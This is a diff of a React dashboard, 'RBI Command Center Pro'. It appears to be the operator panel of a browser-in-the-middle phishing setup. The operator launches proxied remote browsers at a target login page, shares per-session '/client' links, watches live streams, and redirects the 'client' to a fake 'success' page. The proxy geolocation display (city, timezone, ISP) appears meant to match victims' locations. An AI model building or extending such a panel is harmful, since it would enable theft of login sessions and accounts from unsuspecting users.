@@ -9,27 +9,71 @@ export default function ProxyAndStreamManager() {
   const [port, setPort] = useState("");
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [targetUrl, setTargetUrl] = useState("https://zentralmall.com/login");
+  const [targetUrl, setTargetUrl] = useState("");
   const [loading, setLoading] = useState(false);
-  const [isSessionActive, setIsSessionActive] = useState(false);
+  const [embedding, setEmbedding] = useState(false);
+  const [proxyEnabled, setProxyEnabled] = useState(true);
+
+  const [proxyStatusData, setProxyStatusData] = useState<{
+    ip: string;
+    country: string;
+    state: string;
+    city: string;
+    timezone: string;
+    time: string;
+    org: string;
+    status: string;
+  } | null>(null);
   
+  const [sessions, setSessions] = useState<Array<{
+    id: string;
+    targetUrl: string;
+    ip: string;
+    country: string;
+    city: string;
+    status: string;
+    createdAt: string;
+  }>>([]);
+  const [activeSessionId, setActiveSessionId] = useState<string | null>(null);
+  const [connectingSessionId, setConnectingSessionId] = useState<string | null>(null);
+
   const [redirectUrl, setRedirectUrl] = useState("https://success-portal.com/complete");
-  const [ending, setEnding] = useState(false);
   const [redirecting, setRedirecting] = useState(false);
 
-  const [sessionStats, setSessionStats] = useState({
-    ip: "Direct Connection",
-    country: "Global",
-    city: "Active",
-    isp: "Open",
-    status: "Standby"
-  });
+  const handleEmbedProxy = async () => {
+    if (!proxyEnabled || !ip || !port) {
+      alert("Please enter valid Proxy IP and Port, and ensure Proxy is enabled.");
+      return;
+    }
 
-  const handleLaunchBrowser = async (e: React.FormEvent) => {
+    setEmbedding(true);
+    const proxyString = `${proxyType.toLowerCase()}://${username ? `${username}:${password}@` : ""}${ip}:${port}`;
+
+    try {
+      const res = await fetch("/api/admin/proxy-check", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ proxyString })
+      });
+      const data = await res.json();
+      if (data.success && data.details) {
+        setProxyStatusData(data.details);
+        alert("Proxy successfully embedded and verified!");
+      } else {
+        alert("Proxy Error: " + (data.error || "Connection refused"));
+      }
+    } catch (err) {
+      alert("Failed to embed proxy network!");
+    } finally {
+      setEmbedding(false);
+    }
+  };
+
+ const handleLaunchBrowser = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
 
-    const proxyString = ip && port 
+    const proxyString = proxyEnabled && ip && port 
       ? `${proxyType.toLowerCase()}://${username ? `${username}:${password}@` : ""}${ip}:${port}`
       : "";
 
@@ -40,67 +84,78 @@ export default function ProxyAndStreamManager() {
         body: JSON.stringify({ proxyString, targetUrl })
       });
       const data = await res.json();
-      if (data.success) {
-        setIsSessionActive(true);
-        setSessionStats({
-          ip: ip || "Direct Connection",
-          country: "Global",
-          city: "Active",
-          isp: "Network Open",
-          status: "Live & Streaming"
-        });
+      
+      if (data.success && data.sessionId) {
+        const info = data.sessionInfo || {};
+        
+        // 🔥 Backend ka exact verified sessionId use karna hai
+        const newSession = {
+          id: data.sessionId,
+          targetUrl,
+          ip: proxyStatusData?.ip || info.ip || (proxyEnabled && ip ? ip : "Direct Connection"),
+          country: proxyStatusData?.country || info.country || (proxyEnabled && ip ? "Proxy Node" : "Local"),
+          city: proxyStatusData?.city || info.city || "Secured",
+          status: "Live & Streaming",
+          createdAt: new Date().toLocaleTimeString()
+        };
+
+        setSessions(prev => [newSession, ...prev]);
+        setActiveSessionId(data.sessionId);
+        
+        await fetch("/api/admin/session/select", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sessionId: data.sessionId }),
+        }).catch(() => {});
+
+        alert("Browser session successfully launched with active location!");
       } else {
         alert("Error: " + (data.error || "Failed to launch browser"));
       }
     } catch (err) {
-      console.error(err);
       alert("Network request failed!");
     } finally {
       setLoading(false);
     }
   };
 
-  const handleEndSession = async () => {
-    if (!confirm("Kya aap active session terminate karna chahte hain?")) return;
-    
-    setEnding(true);
+  const handleEndSession = async (sessionId: string) => {
+    if (!confirm("Terminate this active session?")) return;
     try {
       const res = await fetch("/api/admin/session/stop", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ redirectUrl }),
+        body: JSON.stringify({ redirectUrl, sessionId }),
       });
       const data = await res.json();
-      if (data.success) {
-        setIsSessionActive(false);
-        setSessionStats(prev => ({ ...prev, status: "Standby" }));
-        alert("Session successfully terminated!");
+      if (data.success || res.ok) {
+        setSessions(prev => prev.filter(s => s.id !== sessionId));
+        if (activeSessionId === sessionId) setActiveSessionId(null);
+        alert("Session terminated successfully!");
       }
-    } catch (err) {
-      console.error(err);
-    } finally {
-      setEnding(false);
-    }
+    } catch (err) {}
   };
 
   const handleRedirectUser = async () => {
     setRedirecting(true);
     try {
-      // Client ko specified link par redirect trigger karne ka API ya action
-      const res = await fetch("/api/admin/session/stop", {
+      const res = await fetch("/api/admin/redirect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ redirectUrl }),
+        body: JSON.stringify({ url: redirectUrl, sessionId: activeSessionId }),
       });
       const data = await res.json();
       if (data.success) {
-        window.open(redirectUrl, "_blank");
+        alert("Redirect signal successfully sent to client side!");
       }
-    } catch (err) {
-      console.error("Redirect failed", err);
-    } finally {
+    } catch (err) {} finally {
       setRedirecting(false);
     }
+  };
+
+  const handleOpenClientTab = (sessionId?: string) => {
+    const query = sessionId ? `?sessionId=${sessionId}` : "";
+    window.open(`/client${query}`, "_blank");
   };
 
   return (
@@ -110,20 +165,43 @@ export default function ProxyAndStreamManager() {
       <div className="flex items-center justify-between border-b border-zinc-800 pb-4">
         <div>
           <h1 className="text-xl font-black tracking-tight">RBI Command Center Pro</h1>
-          <p className="text-xs text-zinc-400">Manage proxy nodes separately and launch isolated browser streams instantly.</p>
+          <p className="text-xs text-zinc-400">Manage proxy nodes with real-time location tracking and isolated browser streams.</p>
         </div>
-        <div className="flex items-center gap-2 bg-emerald-950/50 border border-emerald-500/30 px-3 py-1.5 rounded-xl text-xs text-emerald-400 font-bold">
-          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
-          System Online
+        <div className="flex items-center gap-3">
+          <button 
+            onClick={() => handleOpenClientTab(activeSessionId || undefined)}
+            className="bg-zinc-800 hover:bg-zinc-700 text-zinc-200 px-3 py-1.5 rounded-xl text-xs font-bold transition shadow border border-zinc-700 cursor-pointer flex items-center gap-1.5"
+          >
+            <span>🔗 Open Client Tab</span>
+          </button>
+          <div className="flex items-center gap-2 bg-emerald-950/50 border border-emerald-500/30 px-3 py-1.5 rounded-xl text-xs text-emerald-400 font-bold">
+            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
+            System Online
+          </div>
         </div>
       </div>
 
-      {/* Configuration & Stats Grid */}
+      {/* Configuration & Controls Grid */}
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
         
-        {/* Left Column: Pure Proxy Configuration */}
-        <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 space-y-3 lg:col-span-1 shadow-xl text-xs">
-          <h2 className="text-sm font-bold text-zinc-200 mb-2">Proxy Node Settings</h2>
+        {/* Left Column: Proxy Settings & Advanced Live Status Box */}
+        <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 space-y-4 lg:col-span-1 shadow-xl text-xs">
+          <div className="flex items-center justify-between mb-2">
+            <h2 className="text-sm font-bold text-zinc-200 flex items-center gap-2">
+              <span>🌐 Proxy Node Settings</span>
+              {proxyEnabled && <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>}
+            </h2>
+            <label className="relative inline-flex items-center cursor-pointer">
+              <input 
+                type="checkbox" 
+                checked={proxyEnabled} 
+                onChange={(e) => setProxyEnabled(e.target.checked)} 
+                className="sr-only peer"
+              />
+              <div className="w-9 h-5 bg-zinc-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-zinc-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-emerald-600"></div>
+              <span className="ml-2 text-[10px] font-bold text-zinc-400">{proxyEnabled ? "Active" : "Bypass"}</span>
+            </label>
+          </div>
           
           <div className="grid grid-cols-2 gap-2">
             <div>
@@ -131,7 +209,8 @@ export default function ProxyAndStreamManager() {
               <select 
                 value={proxyType} 
                 onChange={(e) => setProxyType(e.target.value)}
-                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none cursor-pointer"
+                disabled={!proxyEnabled}
+                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none cursor-pointer disabled:opacity-50 font-mono"
               >
                 <option value="socks5">SOCKS5</option>
                 <option value="http">HTTP</option>
@@ -143,20 +222,22 @@ export default function ProxyAndStreamManager() {
                 type="text" 
                 value={port}
                 onChange={(e) => setPort(e.target.value)}
+                disabled={!proxyEnabled}
                 placeholder="1081"
-                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
+                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono disabled:opacity-50"
               />
             </div>
           </div>
 
           <div>
-            <label className="block text-zinc-400 mb-1 font-bold">Proxy IP Address:</label>
+            <label className="block text-zinc-400 mb-1 font-bold">Proxy IP Address / Host:</label>
             <input 
               type="text" 
               value={ip}
               onChange={(e) => setIp(e.target.value)}
-              placeholder="Leave empty for direct connection"
-              className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
+              disabled={!proxyEnabled}
+              placeholder="e.g. 216.26.225.108"
+              className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono disabled:opacity-50"
             />
           </div>
 
@@ -167,8 +248,9 @@ export default function ProxyAndStreamManager() {
                 type="text" 
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
+                disabled={!proxyEnabled}
                 placeholder="username"
-                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
+                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono disabled:opacity-50"
               />
             </div>
             <div>
@@ -177,48 +259,57 @@ export default function ProxyAndStreamManager() {
                 type="text" 
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
+                disabled={!proxyEnabled}
                 placeholder="password"
-                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
+                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono disabled:opacity-50"
               />
             </div>
           </div>
-          <p className="text-[10px] text-zinc-500 italic">Note: Proxy changes browser location/IP automatically when specified.</p>
-        </div>
 
-        {/* Right Column: Status + Browser Launcher + Lifecycle & Redirect Controls */}
-        <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 lg:col-span-2 shadow-xl flex flex-col justify-between space-y-4">
-          
-          {/* Geolocation Status Bar */}
-          <div>
-            <h2 className="text-sm font-bold text-zinc-200 mb-3">Session & Routing Status</h2>
-            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs">
-              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
-                <span className="text-zinc-500 block mb-1">Active IP</span>
-                <span className="font-mono text-emerald-400 font-bold">{sessionStats.ip}</span>
-              </div>
-              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
-                <span className="text-zinc-500 block mb-1">Region</span>
-                <span className="font-bold text-zinc-200">{sessionStats.country}</span>
-              </div>
-              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
-                <span className="text-zinc-500 block mb-1">Node</span>
-                <span className="font-bold text-zinc-200">{sessionStats.city}</span>
-              </div>
-              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
-                <span className="text-zinc-500 block mb-1">Status</span>
-                <span className="text-emerald-400 font-bold flex items-center gap-1.5">
-                  {isSessionActive && <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>}
-                  {sessionStats.status}
-                </span>
-              </div>
+          <div className="space-y-2 pt-2 border-t border-zinc-800">
+            <div className="flex items-center justify-between">
+              <span className="text-zinc-400 font-bold">Tunnel Status:</span>
+              <span className={proxyStatusData ? "text-emerald-400 font-bold" : "text-amber-400 font-bold"}>
+                {proxyStatusData ? "Connected & Verified" : "Direct / Unsecured"}
+              </span>
             </div>
+            <button 
+              onClick={handleEmbedProxy}
+              disabled={embedding}
+              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 rounded-xl text-xs transition shadow-lg cursor-pointer flex items-center justify-center gap-2"
+            >
+              {embedding ? "Embedding & Testing Proxy..." : "🔗 Proxy Embed & Verify"}
+            </button>
           </div>
 
-          {/* Quick Browser URL Launcher with Dynamic Button State */}
+          {proxyStatusData && (
+            <div className="bg-zinc-950 p-3.5 rounded-xl border border-emerald-500/30 space-y-2 text-[11px] font-mono">
+              <div className="flex items-center justify-between border-b border-zinc-800 pb-1 text-emerald-400 font-bold">
+                <span>📍 Live Proxy Telemetry</span>
+                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+              </div>
+              <div className="grid grid-cols-2 gap-1 text-zinc-300">
+                <div><span className="text-zinc-500">IP:</span> {proxyStatusData.ip}</div>
+                <div><span className="text-zinc-500">Country:</span> {proxyStatusData.country}</div>
+                <div><span className="text-zinc-500">State:</span> {proxyStatusData.state}</div>
+                <div><span className="text-zinc-500">City:</span> {proxyStatusData.city}</div>
+                <div><span className="text-zinc-500">Timezone:</span> {proxyStatusData.timezone}</div>
+                <div><span className="text-zinc-500">Local Time:</span> {proxyStatusData.time}</div>
+              </div>
+              <div className="text-[10px] text-zinc-400 truncate pt-1 border-t border-zinc-800">
+                <span className="text-zinc-500">ISP / Org:</span> {proxyStatusData.org}
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* Right Column: Launcher & Global Redirect Controls */}
+        <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 lg:col-span-2 shadow-xl flex flex-col justify-between space-y-4">
+          
           <form onSubmit={handleLaunchBrowser} className="bg-zinc-950 p-4 rounded-xl border border-zinc-800 space-y-3 text-xs">
             <div>
               <p className="font-bold text-zinc-200 text-xs">Quick Browser URL Launcher</p>
-              <p className="text-[10px] text-zinc-400">Enter target website URL to launch browser instantly in the live viewport.</p>
+              <p className="text-[10px] text-zinc-400">Launch a new isolated session with custom proxy location tracking.</p>
             </div>
             <div className="flex items-center gap-2">
               <input 
@@ -232,38 +323,18 @@ export default function ProxyAndStreamManager() {
               <button 
                 type="submit"
                 disabled={loading}
-                className={`font-bold px-5 py-2.5 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap flex items-center gap-2 ${
-                  isSessionActive 
-                    ? "bg-emerald-600 hover:bg-emerald-700 text-white" 
-                    : "bg-blue-600 hover:bg-blue-700 text-white"
-                }`}
+                className="bg-blue-600 hover:bg-blue-700 text-white font-bold px-5 py-2.5 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap"
               >
-                {isSessionActive && <span className="w-2 h-2 rounded-full bg-white animate-ping"></span>}
-                {loading ? "Launching..." : isSessionActive ? "Session Active" : "Launch Browser"}
+                {loading ? "Launching..." : "Launch New Session"}
               </button>
             </div>
           </form>
 
-          {/* End Session Control */}
+          {/* Redirect Control */}
           <div className="bg-zinc-950 p-4 rounded-xl border border-zinc-800 flex items-center justify-between gap-4 text-xs">
             <div>
-              <p className="font-bold text-zinc-200">Session Lifecycle Control</p>
-              <p className="text-[10px] text-zinc-400">Keep session active or terminate it manually.</p>
-            </div>
-            <button 
-              onClick={handleEndSession}
-              disabled={ending}
-              className="bg-rose-600 hover:bg-rose-700 text-white font-bold px-5 py-2.5 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap"
-            >
-              {ending ? "Ending..." : "End Session"}
-            </button>
-          </div>
-
-          {/* Redirect User Control */}
-          <div className="bg-zinc-950 p-4 rounded-xl border border-zinc-800 flex items-center justify-between gap-4 text-xs">
-            <div>
-              <p className="font-bold text-zinc-200">User Redirect Control</p>
-              <p className="text-[10px] text-zinc-400">Redirect client to any specified URL/page.</p>
+              <p className="font-bold text-zinc-200">Global User Redirect Control</p>
+              <p className="text-[10px] text-zinc-400">Redirect client to any specified URL instantly.</p>
             </div>
             <div className="flex items-center gap-2 w-full max-w-md">
               <input 
@@ -278,7 +349,7 @@ export default function ProxyAndStreamManager() {
                 disabled={redirecting}
                 className="bg-amber-600 hover:bg-amber-700 text-white font-bold px-4 py-2 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap"
               >
-                {redirecting ? "Redirecting..." : "Redirect User"}
+                {redirecting ? "Redirecting..." : "Redirect Client"}
               </button>
             </div>
           </div>
@@ -287,10 +358,106 @@ export default function ProxyAndStreamManager() {
 
       </div>
 
+      {/* Active Browser Sessions Table */}
+      <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 shadow-xl space-y-4">
+        <div className="flex items-center justify-between">
+          <h2 className="text-sm font-bold text-zinc-200">Active Browser Sessions & Location Tracking</h2>
+          <span className="text-[10px] text-zinc-400 bg-zinc-950 px-3 py-1 rounded-full border border-zinc-800">
+            Active Sessions: {sessions.length}
+          </span>
+        </div>
+        {sessions.length === 0 ? (
+          <p className="text-xs text-zinc-500 py-6 text-center">Koi active session maujood nahi hai. Upar diye gaye form se naya session launch karein.</p>
+        ) : (
+          <div className="overflow-x-auto">
+            <table className="w-full text-left text-xs">
+              <thead className="bg-zinc-950 text-zinc-400 border-b border-zinc-800">
+                <tr>
+                  <th className="p-3">Session ID</th>
+                  <th className="p-3">Target URL</th>
+                  <th className="p-3">Proxy IP</th>
+                  <th className="p-3">Country / State / City</th>
+                  <th className="p-3">Status</th>
+                  <th className="p-3">View Browser</th>
+                  <th className="p-3">Client Link</th>
+                  <th className="p-3 text-right">Actions</th>
+                </tr>
+              </thead>
+              <tbody className="divide-y divide-zinc-800 font-mono">
+                {sessions.map((sess) => {
+                  const isSelected = activeSessionId === sess.id;
+                  const isConnecting = connectingSessionId === sess.id;
+                  return (
+                    <tr 
+                      key={sess.id} 
+                      className={`transition hover:bg-zinc-800/50 ${isSelected ? 'bg-blue-950/40 border-l-4 border-blue-500' : ''}`}
+                    >
+                      <td className="p-3 text-emerald-400 font-bold">{sess.id}</td>
+                      <td className="p-3 text-zinc-300 truncate max-w-xs">{sess.targetUrl}</td>
+                      <td className="p-3 text-zinc-200 font-bold">{sess.ip}</td>
+                      <td className="p-3 text-zinc-400">{sess.country} / {sess.city}</td>
+                      <td className="p-3 text-emerald-400">● {sess.status}</td>
+                      
+                      {/* 🔥 View Browser Connecting / Connected Button */}
+                      <td className="p-3">
+                        <button 
+                          onClick={async () => {
+                            setConnectingSessionId(sess.id);
+                            setActiveSessionId(sess.id);
+                            await fetch("/api/admin/session/select", {
+                              method: "POST",
+                              headers: { "Content-Type": "application/json" },
+                              body: JSON.stringify({ sessionId: sess.id }),
+                            }).catch(() => {});
+                            
+                            // Short delay to switch button state to connected
+                            setTimeout(() => {
+                              setConnectingSessionId(null);
+                            }, 800);
+                          }}
+                          className={`px-3 py-1.5 rounded-xl text-[10px] font-bold transition shadow cursor-pointer whitespace-nowrap ${
+                            isConnecting 
+                              ? "bg-amber-600 text-white animate-pulse" 
+                              : isSelected 
+                              ? "bg-emerald-600 hover:bg-emerald-700 text-white" 
+                              : "bg-blue-600 hover:bg-blue-700 text-white"
+                          }`}
+                        >
+                          {isConnecting ? "⏳ Connecting..." : isSelected ? "🟢 Connected" : "🔵 View Browser"}
+                        </button>
+                      </td>
+
+                      <td className="p-3">
+                        <button 
+                          onClick={() => handleOpenClientTab(sess.id)}
+                          className="bg-zinc-800 hover:bg-zinc-700 text-blue-400 px-2.5 py-1 rounded text-[10px] font-bold cursor-pointer"
+                        >
+                          /client (Open)
+                        </button>
+                      </td>
+                      <td className="p-3 text-right space-x-2">
+                        <button 
+                          onClick={() => handleEndSession(sess.id)}
+                          className="bg-rose-600 hover:bg-rose-700 text-white px-3 py-1 rounded text-[10px] font-bold cursor-pointer"
+                        >
+                          End Session
+                        </button>
+                      </td>
+                    </tr>
+                  );
+                })}
+              </tbody>
+            </table>
+          </div>
+        )}
+      </div>
+
       {/* Live Stream Viewport Container */}
       <div className="mt-6">
-        <h2 className="text-sm font-bold text-zinc-200 mb-3">Live Remote Browser Viewport</h2>
-        <LiveStreamViewer targetUrl={targetUrl} />
+        <h2 className="text-sm font-bold text-zinc-200 mb-3">
+          {activeSessionId ? `Live Stream Viewport (Active Session: ${activeSessionId})` : "Live Stream Viewport (Session select karne ke liye table par click karein)"}
+        </h2>
+        <LiveStreamViewer activeSessionId={activeSessionId} />
       </div>
 
     </div>
